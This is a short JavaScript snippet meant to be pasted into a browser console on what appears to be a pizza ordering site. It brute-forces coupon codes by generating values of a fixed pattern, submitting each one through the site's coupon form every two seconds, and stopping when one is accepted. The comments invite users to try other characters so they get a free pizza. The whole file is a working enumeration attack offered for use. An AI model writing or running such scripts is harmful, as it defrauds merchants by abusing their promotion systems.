Number.prototype.pad = function(n) {
    return ('0000000000' + this).slice((n || 2) * -1);
}

$ = jQuery;

function applyCoupon(character, counter) {
  if($($(".jqimessage h3")[0]).text() == 'Invalid Coupon'){
    console.log("Invalid coupon");
    $("#jqi_state0_buttonOk").click();
  } else if ($($(".jqimessage h3")[0]).text() == 'Coupon Added Successfully'){
    console.log("You shall pass with a free pizza!");
    return;
  }
  if(window.halt)
    return;
  var val = 'BT4C' + character.toUpperCase() + (new Number(counter++)).pad(3) + '1';
  console.log('Trying ' + val);
  jQuery('#coupon-code-field').val(val);
  $('#redeem-coupon-button').click();
  setTimeout(function(x) { return function() {applyCoupon(character, x)} }(counter), 2000);
}

// Uncomment the below line to call the function. Try different characters if a lot of coupon fail.
// applyCoupon('d', 300)
